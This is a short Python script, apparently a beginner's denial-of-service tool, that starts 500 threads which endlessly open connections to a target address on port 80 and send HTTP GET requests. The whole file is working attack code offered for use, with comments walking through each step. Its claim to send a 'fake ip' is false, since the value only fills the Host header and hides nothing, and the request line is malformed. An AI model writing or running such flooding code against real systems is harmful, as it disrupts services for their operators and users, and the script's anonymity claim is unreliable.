import threading #python is using simulated multithreading 
import socket

target = "192.168.1.1" #ip adress or domain name of the target
port = 80 #port of the target
fake_ip = "182.21.20.32" #fake ip adress (its not fully annonymous)

"""NOTE:
    When we write a DDOS script we choose a port, each port casues to a different output
    For example:
    port 22 is for ssh (secure shell)
    port 80 is for http (hypertext transfer protocol)
"""
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create a socket
        s.connect((target,port)) #connect to the target
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port)) #send a request to the target
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port)) #send a fake ip to the target
        s.close() #close the socket

for i in range(500): #number of threads
    thread = threading.Thread(target=attack) #create a thread
    thread.start() #start the thread    